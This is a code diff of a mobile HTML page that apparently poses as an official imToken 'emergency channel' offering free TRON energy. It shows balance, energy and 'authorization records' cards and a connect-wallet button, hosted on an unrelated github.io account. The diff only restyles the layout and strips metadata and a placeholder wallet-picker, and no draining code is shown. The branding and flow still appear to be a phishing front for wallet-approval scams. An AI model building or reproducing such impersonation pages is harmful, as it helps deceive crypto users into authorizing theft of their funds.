@@ -6,12 +6,6 @@
   <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
   <link rel="icon" href="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png">
   <title>imToken官方应急通道</title>
-  <meta property="og:title" content="imToken官方应急通道" />
-  <meta property="og:description" content="imToken专属能量领取通道" />
-  <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
-  <meta property="og:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
-  <meta property="og:type" content="website" />
-  
   <style type="text/css">
     * {
       margin: 0;
@@ -20,12 +14,11 @@
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     }
     body {
-      padding-top: 70px; /* 给固定顶部容器留空间 */
-      padding: 10px;
       background-color: #f5f5f5;
+      padding: 10px;
     }
 
-    /* 保留你想要的加载动画 */
+    /* 保留你要的加载动画 */
     #Loading {
       width: 100%;
       height: 100vh;
@@ -83,213 +76,109 @@
       100% { transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg); }
     }
 
-    /* 1. 顶部容器（固定） */
-    .top-nav {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      padding: 12px 10px;
-      background-color: #fff;
+    /* 顶部栏（匹配截图） */
+    .top-bar {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      border-bottom: 2px solid #c23631; /* 红色边框 */
-      z-index: 999;
+      margin-bottom: 15px;
     }
-    .top-nav .logo {
-      width: 40px; /* logo占位 */
-      height: 40px;
-      background-color: #f0f0f0;
-      border-radius: 4px;
+    .top-bar .logo-placeholder {
+      width: 60px;
+      height: 30px;
+      background-color: #eaeaea;
       display: flex;
       align-items: center;
       justify-content: center;
       font-size: 12px;
       color: #999;
     }
-    .top-nav .right-area {
+    .top-bar .right-group {
       display: flex;
-      gap: 10px;
-      align-items: center;
+      gap: 8px;
     }
-    .top-nav .lang-btn {
+    .top-bar .lang-btn {
       padding: 4px 8px;
-      border: 1px solid #c23631; /* 红色边框 */
-      border-radius: 4px;
-      background-color: #fff;
-      font-size: 12px;
-      color: #c23631;
-      cursor: pointer;
-    }
-    .top-nav .connect-btn {
-      padding: 6px 12px;
       border: 1px solid #c23631;
+      border-radius: 2px;
+      background-color: #fff;
+      color: #c23631;
+      font-size: 12px;
+    }
+    .top-bar .connect-btn {
+      padding: 4px 12px;
       background-color: #c23631;
       color: #fff;
-      border-radius: 4px;
+      border: none;
+      border-radius: 2px;
       font-size: 14px;
-      cursor: pointer;
     }
 
-    /* 通用容器样式（所有容器红色边框） */
+    /* 通用容器（红色边框，匹配截图） */
     .card {
+      border: 2px solid #c23631;
+      border-radius: 4px;
       background-color: #fff;
-      border-radius: 8px;
-      padding: 15px;
+      padding: 10px;
       margin-bottom: 15px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
-      border: 2px solid #c23631; /* 红色边框 */
       display: none;
     }
 
-    /* 2. 余额容器（保留能量、带宽显示） */
-    .account-card {
-      position: relative;
-    }
-    .account-header {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 15px;
-    }
-    .account-header .user-logo {
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      background-color: #f0f0f0; /* 用户logo占位 */
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      color: #999;
-    }
-    .account-header .addr {
-      font-size: 14px;
-      color: #666;
-      word-break: break-all;
-    }
-    .account-info {
+    /* 1. 余额容器（匹配截图的两行两列） */
+    .balance-card .balance-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 15px;
-      font-size: 16px;
+      gap: 8px;
+      font-size: 14px;
     }
-    .account-info .item {
-      display: flex;
-      flex-direction: column;
-    }
-    .account-info .label {
+    .balance-card .label {
       color: #999;
       font-size: 12px;
-      margin-bottom: 4px;
     }
-    .account-info .value {
+    .balance-card .value {
       color: #333;
       font-weight: 500;
     }
 
-    /* 3. 剩余能量容器 */
-    .energy-card {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
+    /* 2. 剩余能量容器（匹配截图） */
     .energy-card .title {
       font-size: 16px;
       font-weight: 600;
-      color: #333;
+      margin-bottom: 8px;
     }
-    .energy-card .num-box {
-      padding: 12px;
+    .energy-card .num-input {
+      width: 100%;
+      padding: 8px;
       border: 1px solid #c23631;
-      border-radius: 4px;
-      font-size: 18px;
-      font-weight: 600;
+      border-radius: 2px;
+      font-size: 16px;
       color: #c23631;
+      margin-bottom: 5px;
     }
-    .energy-card .text-placeholder {
+    .energy-card .tip {
       font-size: 12px;
       color: #999;
     }
 
-    /* 4. 授权记录容器 */
-    .auth-record-card .title {
+    /* 3. 授权记录容器（匹配截图） */
+    .auth-card .title {
       font-size: 16px;
       font-weight: 600;
-      color: #333;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
     }
-    .auth-record-card .record-list {
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-    }
-    .auth-record-card .record-item {
-      padding: 10px;
-      border: 1px solid #f0f0f0;
-      border-radius: 4px;
-      font-size: 14px;
-      color: #333;
-    }
-
-    /* 5. 钱包选择弹窗 */
-    .wallet-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
+    .auth-card .record-area {
       width: 100%;
-      height: 100vh;
-      background-color: rgba(0,0,0,0.5);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-    }
-    .wallet-modal .content {
-      width: 90%;
-      max-width: 350px;
-      background-color: #fff;
-      border-radius: 8px;
-      padding: 20px;
-      border: 2px solid #c23631;
-    }
-    .wallet-modal .title {
-      font-size: 18px;
-      font-weight: 600;
-      text-align: center;
-      margin-bottom: 20px;
-      color: #333;
-    }
-    .wallet-modal .wallet-list {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-    .wallet-modal .wallet-item {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      padding: 12px;
-      border: 1px solid #c23631;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .wallet-modal .wallet-logo {
-      width: 32px;
-      height: 32px;
-      background-color: #f0f0f0; /* logo占位 */
-      border-radius: 4px;
-    }
-    .wallet-modal .wallet-name {
-      font-size: 16px;
-      color: #333;
+      padding: 8px;
+      border: 1px solid #eaeaea;
+      border-radius: 2px;
+      font-size: 14px;
+      color: #999;
+      background-color: #f9f9f9;
     }
   </style>
-  <script src="imtoken://browser"></script>
 </head>
 <body>
-  <!-- 保留加载动画 -->
+  <!-- 加载动画 -->
   <div id="Loading">
     <div class="loader">
       <div class="inner one"></div>
@@ -298,106 +187,61 @@
     </div>
   </div>
 
-  <!-- 1. 固定顶部容器 -->
-  <div class="top-nav" id="topNav">
-    <div class="logo">LOGO占位</div>
-    <div class="right-area">
+  <!-- 顶部栏（匹配截图） -->
+  <div class="top-bar" id="topBar">
+    <div class="logo-placeholder">LOGO占位</div>
+    <div class="right-group">
       <button class="lang-btn">中文简体</button>
       <button class="connect-btn" id="connectBtn">连接钱包</button>
     </div>
   </div>
 
-  <!-- 2. 余额容器（保留能量、带宽显示） -->
-  <div class="card account-card" id="accountCard">
-    <div class="account-header">
-      <div class="user-logo">用户LOGO</div>
-      <div class="addr" id="accountAddr">未连接钱包</div>
-    </div>
-    <div class="account-info">
-      <div class="item">
+  <!-- 1. 余额容器（匹配截图） -->
+  <div class="card balance-card" id="balanceCard">
+    <div class="balance-grid">
+      <div>
         <div class="label">TRX (可用)</div>
-        <div class="value" id="trxBalance">0.00</div>
+        <div class="value">0.00</div>
       </div>
-      <div class="item">
+      <div>
         <div class="label">USDT (可用)</div>
-        <div class="value" id="usdtBalance">0.00</div>
+        <div class="value">0.00</div>
       </div>
-      <div class="item">
+      <div>
         <div class="label">能量 (可用)</div>
-        <div class="value" id="energy">--</div>
+        <div class="value">--</div>
       </div>
-      <div class="item">
+      <div>
         <div class="label">带宽 (可用)</div>
-        <div class="value" id="bandwidth">0</div>
+        <div class="value">0</div>
       </div>
     </div>
   </div>
 
-  <!-- 3. 剩余能量容器 -->
+  <!-- 2. 剩余能量容器（匹配截图） -->
   <div class="card energy-card" id="energyCard">
     <div class="title">剩余能量</div>
-    <div class="num-box" id="remainingEnergy">0</div>
-    <div class="text-placeholder">能量有效期：1小时（过期自动回收）</div>
+    <input type="text" class="num-input" id="remainingEnergy" value="0" readonly>
+    <div class="tip">能量有效期：1小时（过期自动回收）</div>
   </div>
 
-  <!-- 4. 授权记录容器 -->
-  <div class="card auth-record-card" id="authRecordCard">
+  <!-- 3. 授权记录容器（匹配截图） -->
+  <div class="card auth-card" id="authCard">
     <div class="title">授权记录</div>
-    <div class="record-list" id="authRecordList">
-      <div class="record-item">暂无授权记录</div>
-    </div>
-  </div>
-
-  <!-- 5. 钱包选择弹窗 -->
-  <div class="wallet-modal" id="walletModal">
-    <div class="content">
-      <div class="title">选择钱包</div>
-      <div class="wallet-list">
-        <div class="wallet-item" id="wallet1">
-          <div class="wallet-logo">LOGO1</div>
-          <div class="wallet-name">imToken</div>
-        </div>
-        <div class="wallet-item" id="wallet2">
-          <div class="wallet-logo">LOGO2</div>
-          <div class="wallet-name">MetaMask</div>
-        </div>
-        <div class="wallet-item" id="wallet3">
-          <div class="wallet-logo">LOGO3</div>
-          <div class="wallet-name">TokenPocket</div>
-        </div>
-        <div class="wallet-item" id="wallet4">
-          <div class="wallet-logo">LOGO4</div>
-          <div class="wallet-name">Trust Wallet</div>
-        </div>
-      </div>
-    </div>
+    <div class="record-area" id="authRecord">暂无授权记录</div>
   </div>
 
   <script>
     // 加载动画逻辑
-    document.addEventListener('DOMContentLoaded', async () => {
+    document.addEventListener('DOMContentLoaded', () => {
       setTimeout(() => {
         document.getElementById("Loading").style.display = "none";
-        // 显示页面容器
-        document.getElementById("topNav").style.display = "flex";
-        document.getElementById("accountCard").style.display = "block";
+        // 显示所有容器
+        document.getElementById("topBar").style.display = "flex";
+        document.getElementById("balanceCard").style.display = "block";
         document.getElementById("energyCard").style.display = "block";
-        document.getElementById("authRecordCard").style.display = "block";
+        document.getElementById("authCard").style.display = "block";
       }, 2000);
-
-      // 点击“连接钱包”显示弹窗
-      document.getElementById("connectBtn").addEventListener('click', () => {
-        document.getElementById("walletModal").style.display = "flex";
-      });
-
-      // 钱包选项点击（示例逻辑，后续可绑定实际连接）
-      const walletItems = document.querySelectorAll('.wallet-item');
-      walletItems.forEach(item => {
-        item.addEventListener('click', () => {
-          alert(`选择了钱包：${item.querySelector('.wallet-name').textContent}`);
-          document.getElementById("walletModal").style.display = "none";
-        });
-      });
     });
   </script>
 </body>
